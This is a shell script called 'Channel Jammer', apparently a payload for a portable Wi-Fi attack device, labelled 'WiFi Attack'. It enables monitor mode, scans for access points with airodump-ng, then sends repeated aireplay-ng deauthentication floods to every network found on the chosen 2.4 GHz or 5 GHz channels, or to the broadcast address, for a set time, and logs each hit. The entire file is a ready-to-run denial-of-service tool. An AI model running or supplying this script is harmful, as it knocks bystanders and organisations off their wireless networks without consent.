#!/bin/sh
# Title: Channel Jammer
# Author: NullSec
# Description: Disrupt WiFi across multiple channels using deauth
# Category: WiFi Attack

LOOT_DIR="/mmc/nullsec/jammer"
mkdir -p "$LOOT_DIR"

echo "📻 CHANNEL JAMMER"
echo "━━━━━━━━━━━━━━━━━"

[ ! -d "/sys/class/net/wlan0" ] && { echo "[!] wlan0 not found!"; exit 1; }

echo "[*] Enabling monitor mode..."
airmon-ng start wlan0 >/dev/null 2>&1
MON_IF=$(iw dev | grep -oE "wlan[0-9]mon" | head -1)
[ -z "$MON_IF" ] && MON_IF="wlan0mon"

echo ""
echo "Jamming modes:"
echo "1) Single channel"
echo "2) Channel range (1-6, 6-11, etc)"
echo "3) All 2.4GHz channels (1-11)"
echo "4) All 5GHz channels"
echo ""
echo -n "Choice [3]: "
read MODE
MODE=${MODE:-3}

case "$MODE" in
    1)
        echo -n "Channel to jam: "
        read CHANNELS
        ;;
    2)
        echo -n "Start channel: "
        read START_CH
        echo -n "End channel: "
        read END_CH
        CHANNELS=$(seq $START_CH $END_CH | tr '\n' ' ')
        ;;
    3)
        CHANNELS="1 2 3 4 5 6 7 8 9 10 11"
        ;;
    4)
        CHANNELS="36 40 44 48 52 56 60 64 149 153 157 161 165"
        ;;
esac

echo -n "Duration in seconds [120]: "
read DURATION
DURATION=${DURATION:-120}

echo ""
echo "[*] Scanning for targets on selected channels..."
LOG_FILE="$LOOT_DIR/jam_$(date +%Y%m%d_%H%M).log"
echo "Channel Jammer Log - $(date)" > "$LOG_FILE"

# Quick scan to find APs on target channels
timeout 10 airodump-ng "$MON_IF" -w /tmp/jamscan --output-format csv 2>/dev/null &
sleep 10

# Extract targets
TARGETS=""
if [ -f /tmp/jamscan-01.csv ]; then
    for CH in $CHANNELS; do
        grep -E "^[0-9A-F]{2}:" /tmp/jamscan-01.csv | while read line; do
            AP_CH=$(echo "$line" | cut -d',' -f4 | tr -d ' ')
            if [ "$AP_CH" = "$CH" ]; then
                BSSID=$(echo "$line" | cut -d',' -f1 | tr -d ' ')
                echo "$BSSID $CH"
            fi
        done
    done > /tmp/jam_targets.txt
fi

TARGET_COUNT=$(wc -l < /tmp/jam_targets.txt 2>/dev/null || echo 0)
echo "[+] Found $TARGET_COUNT targets"

if [ "$TARGET_COUNT" = "0" ]; then
    echo "[!] No targets found. Doing broadcast deauth..."
    END_TIME=$(($(date +%s) + DURATION))
    while [ $(date +%s) -lt $END_TIME ]; do
        for CH in $CHANNELS; do
            iwconfig "$MON_IF" channel $CH 2>/dev/null
            aireplay-ng -0 5 -a FF:FF:FF:FF:FF:FF "$MON_IF" 2>/dev/null &
            sleep 1
        done
    done
else
    echo "[*] Jamming targets..."
    END_TIME=$(($(date +%s) + DURATION))
    while [ $(date +%s) -lt $END_TIME ]; do
        while read BSSID CH; do
            [ -z "$BSSID" ] && continue
            iwconfig "$MON_IF" channel $CH 2>/dev/null
            echo "[*] Deauth $BSSID (CH:$CH)"
            echo "$(date +%H:%M:%S) Deauth $BSSID CH:$CH" >> "$LOG_FILE"
            aireplay-ng -0 10 -a "$BSSID" "$MON_IF" 2>/dev/null &
            sleep 2
        done < /tmp/jam_targets.txt
    done
fi

# Cleanup
killall aireplay-ng 2>/dev/null
airmon-ng stop "$MON_IF" >/dev/null 2>&1
rm -f /tmp/jamscan* /tmp/jam_targets.txt 2>/dev/null

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━"
echo "📻 JAMMING COMPLETE"
echo "━━━━━━━━━━━━━━━━━━━━━━"
echo "Channels: $CHANNELS"
echo "Log: $LOG_FILE"
